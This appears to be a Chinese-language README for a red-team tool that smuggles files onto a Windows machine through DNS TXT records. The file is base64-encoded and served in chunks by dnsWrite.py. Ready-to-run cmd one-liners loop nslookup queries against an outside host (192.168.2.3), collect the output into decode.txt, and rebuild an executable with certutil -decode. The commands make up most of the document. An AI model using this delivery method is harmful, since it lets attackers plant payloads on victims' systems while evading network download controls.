# 原理
利用dns的TXT记录，先把要写入的文件base64编码，然后把文件先切割为32kb的数组列表: L1, L2....，再将每个元素切割为长度为254的列表，将此作为txt记录返回。

## 0x1. 文件托管
```bash
python dnsWrite.py <calc.exe>
```

## 0x2. 写入文件
利用域名的Txt解析，从baidu0.com开始解析：`baidu0.com、baidu1.com ...`，客户端输入以下命令，一直到服务端出现Done, Press Ctrl + C to Exit，表示发送完毕。客户端再利用`certutil -decode decode.txt calc.exe`转码为exe文件:

```cmd
cmd /v:on /Q /c "set a= && set b=  && for /f "tokens=*" %i in ('nslookup -qt^=TXT baidu0.com 192.168.2.3 ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >> decode.txt 

cmd /v:on /Q /c "set a= && set b=  && for /f "tokens=*" %i in ('nslookup -qt^=TXT baidu1.com 192.168.2.3 ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >> decode.txt 

...
```

如果文件特别大，可以再加一层for循环，下面是循环了20次请求域名的解析，注意观察服务端是否发送完成，当服务端发送完成就可以断开了，由于循环还在继续:
```cmd
cmd /v:on /Q /c "for /l %i in (0,1,20) do (set a= && set b= && for /f "tokens=*" %j in ('nslookup -qt^=TXT baidu%i.com 192.168.2.3 ^| findstr "exec"') do (set a=%j && echo !a:~5,-2! >> decode.txt))"
```

脚本已经计算好了循环次数，客户端直接使用即可:

![image](https://user-images.githubusercontent.com/2935865/229475619-7102660f-af8d-4d4f-a7a2-dcf1c88a3374.png)


## 0x3. 参考文章
* [远程下载的通用替代方案 ｜ 红队攻防](https://mp.weixin.qq.com/s/Z1zp7klk--uQ1OnzljNESw)
